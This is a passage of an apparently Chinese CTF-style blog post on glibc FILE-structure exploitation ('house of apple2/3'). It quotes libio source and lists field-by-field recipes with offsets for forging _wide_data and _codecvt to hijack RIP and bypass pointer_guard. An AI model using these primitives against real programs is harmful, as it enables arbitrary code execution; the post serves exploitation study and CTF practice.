(_IO_wdefault_xsgetn)</span><br></pre></td></tr></table></figure><p>需要设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end</code>，使得<code>count</code>为<code>0</code>，不进入<code>if</code>分支。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wint_t</span></span><br><span class="line">    __wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">        _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">        <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF)</span><br><span class="line">            <span class="keyword">return</span> WEOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要设置<code>fp-&gt;mode &gt; 0</code>，并且<code>fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">    _IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要设置<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code></p><p>构造方式：</p><ol><li><code>_flags</code>设置为<code>0x800</code></li><li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li><li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li></ol><h2 id="house-of-apple3"><a href="#house-of-apple3" class="headerlink" title="house of apple3"></a>house of apple3</h2><p>前两篇文章中的利用链主要关注<code>_wide_data</code>成员，而本篇文章并不会特别关注<code>_wide_data</code>，而是关注<code>FILE</code>结构体的另外一个成员<code>_codecvt</code>的利用。</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li>已知<code>heap</code>地址和<code>glibc</code>地址</li><li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li><li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_codecvt</code>，一般使用<code>largebin attack</code>去控制</li></ol><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>上面提到，本篇文章并不会特别关注<code>_wide_data</code>成员，这是因为<code>_wide_data</code>设置不当的话会影响某些利用链的分支走向。但是，如果采用默认的<code>_wide_data</code>成员（默认会指向<code>_IO_wide_data_2</code>，除了<code>_wide_vtable</code>外其他成员均默认为<code>0</code>），也并不影响<code>house of apple3</code>的利用。因此，如果能伪造整个<code>FILE</code>结构体，则需要设置合适的<code>_wide_data</code>；如果只能伪部分<code>FILE</code>的成员的话，保持<code>fp-&gt;_wide_data</code>为默认地址即可。</p><h3 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h3><p><code>FILE</code>结构体中有一个成员<code>struct _IO_codecvt *_codecvt;</code>，偏移为<code>0x98</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>__cd_in</code>和<code>__cd_out</code>是同一种类型的数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">step</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span> <span class="title">step_data</span>;</span></span><br><span class="line">&#125; _IO_iconv_t;</span><br></pre></td></tr></table></figure><p>再观察以下结构体俩变量的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_loaded_object</span> *__<span class="title">shlib_handle</span>;</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *__modname;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="keyword">int</span> __counter;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">char</span> *__from_name;</span><br><span class="line">  <span class="keyword">char</span> *__to_name;</span><br><span class="line"> </span><br><span class="line">  __gconv_fct __fct;</span><br><span class="line">  __gconv_btowc_fct __btowc_fct;</span><br><span class="line">  __gconv_init_fct __init_fct;</span><br><span class="line">  __gconv_end_fct __end_fct;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Information about the number of bytes needed or produced in this</span></span><br><span class="line"><span class="comment">     step.  This helps optimizing the buffer sizes.  */</span></span><br><span class="line">  <span class="keyword">int</span> __min_needed_from;</span><br><span class="line">  <span class="keyword">int</span> __max_needed_from;</span><br><span class="line">  <span class="keyword">int</span> __min_needed_to;</span><br><span class="line">  <span class="keyword">int</span> __max_needed_to;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flag whether this is a stateful encoding or not.  */</span></span><br><span class="line">  <span class="keyword">int</span> __stateful;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">void</span> *__data;        <span class="comment">/* Pointer to step-local data.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> *__outbuf;    <span class="comment">/* Output buffer for this step.  */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> *__outbufend; <span class="comment">/* Address of first byte after the output</span></span><br><span class="line"><span class="comment">                 buffer.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Is this the last module in the chain.  */</span></span><br><span class="line">  <span class="keyword">int</span> __flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Counter for number of invocations of the module function for this</span></span><br><span class="line"><span class="comment">     descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> __invocation_counter;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flag whether this is an internal use of the module (in the mb*towc*</span></span><br><span class="line"><span class="comment">     and wc*tomb* functions) or regular with iconv(3).  */</span></span><br><span class="line">  <span class="keyword">int</span> __internal_use;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">__mbstate_t</span> *__statep;</span><br><span class="line">  <span class="keyword">__mbstate_t</span> __state;    <span class="comment">/* This element must not be used directly by</span></span><br><span class="line"><span class="comment">               any module; always use STATEP!  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>house of apple3</code>的利用主要关注以下三个函数：<code>__libio_codecvt_out</code>、<code>__libio_codecvt_in</code>和<code>__libio_codecvt_length</code>。三个函数的利用点都差不多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">    __<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">                        <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">                        <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">                        <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">size_t</span> dummy;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *from_start_copy = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) from_start;</span><br><span class="line"></span><br><span class="line">    codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) to_start;</span><br><span class="line">    codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) to_end;</span><br><span class="line">    codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line"></span><br><span class="line">    __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">        PTR_DEMANGLE (fct);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    status = DL_CALL_FCT (fct,</span><br><span class="line">                          (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">                           &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*__gconv_fct)</span> <span class="params">(struct __gconv_step *, struct __gconv_step_data *,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> **, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">char</span> **, <span class="keyword">size_t</span> *, <span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DL_CALL_FCT</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DL_CALL_FCT(fct, args) fct args</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这里呢最后这个宏就是调用fct (gs, …)</p><p>在<code>_IO_wfile_underflow</code>函数中调用了<code>__libio_codecvt_in</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wint_t</span></span><br><span class="line">    _IO_wfile_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">status</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno (EBADF);</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">        <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">    cd = fp-&gt;_codecvt;</span><br><span class="line">    <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *read_stop = (<span class="keyword">const</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">        fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">        fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">            fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">        status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                                     fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">                                     &amp;read_stop,</span><br><span class="line">                                     fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">                                     fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">                                     &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_wfile_underflow</code>又是<code>_IO_wfile_jumps</code>这个<code>_IO_jump_t</code>类型变量的成员函数</p><p>所以总的来说利用方式为：劫持或者伪造<code>FILE</code>结构体的<code>fp-&gt;vtable</code>为<code>_IO_wfile_jumps</code>，<code>fp-&gt;_codecvt</code>为可控堆地址，当程序执行<code>IO</code>操作时，控制程序执行流走到<code>_IO_wfile_underflow</code>，设置好<code>fp-&gt;codecvt-&gt;__cd_in</code>结构体，使得最终调用到<code>__libio_codecvt_in</code>中的<code>DL_CALL_FCT</code>宏，伪造函数指针，进而控制程序执行流。需要注意的是设置gs-&gt;__shlib_handle == NULL绕过__pointer_guard指针的加密保护</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>因为原文作者确实非常牛逼，甚至链都找好了，所以这里还是贴上原文的内容</p><h4 id="IO-wfile-underflow"><a href="#IO-wfile-underflow" class="headerlink" title="_IO_wfile_underflow"></a><strong>_IO_wfile_underflow</strong></h4><p>调用链：<code>_IO_wfile_underflow</code>=&gt;<code>__libio_codecvt_in</code>=&gt;<code>DL_CALL_FCT</code>=&gt;<code>gs =fp-&gt;_codecvt-&gt;__cd_in.step</code>=&gt;<code>*(gs-&gt;__fct)(gs)</code></p><p>这条链是在利用原理当作示例的一条，所以这里只给出构造方式：</p><ol><li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code>即可</li><li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li></ol><h4 id="IO-wfile-underflow-mmap-1"><a href="#IO-wfile-underflow-mmap-1" class="headerlink" title="_IO_wfile_underflow_mmap"></a><strong>_IO_wfile_underflow_mmap</strong></h4><p>调用链：<code>_IO_wfile_underflow_mmap</code>=&gt;<code>__libio_codecvt_in</code>=&gt;<code>DL_CALL_FCT</code>=&gt;<code>gs=fp-&gt;_codecvt-&gt;__cd_in.step</code>=&gt;<code>*(gs-&gt;__fct)(gs)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">wint_t</span></span><br><span class="line">    _IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *read_stop;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno (EBADF);</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">        <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">    cd = fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">        <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">        &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">        <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">    read_stop = (<span class="keyword">const</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">            fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">        &#125;</span><br><span class="line">        _IO_wdoallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">        fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">    __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                        fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">                        &amp;read_stop,</span><br><span class="line">                        fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">                        fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">                        &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base != NULL</code>不进入调用。</p><p>构造方法：</p><ol><li><code>_flags</code>设置为<code>~4</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li><li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>设置为非<code>0</code>，即满足<code>*(A + 0x30) != 0</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li></ol><h4 id="IO-wdo-write"><a href="#IO-wdo-write" class="headerlink" title="_IO_wdo_write"></a><strong>_IO_wdo_write</strong></h4><p>调用链：<code>_IO_new_file_sync</code>=&gt;<code>_IO_do_flush</code>=&gt;<code>_IO_wdo_write</code>=&gt;<code>__libio_codecvt_out</code>=&gt;<code>DL_CALL_FCT</code>=&gt;<code>gs =</code> <code>fp-&gt;_codecvt-&gt;__cd_out.step</code>=&gt;<code>*(gs-&gt;__fct)(gs)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">    _IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">ssize_t</span> 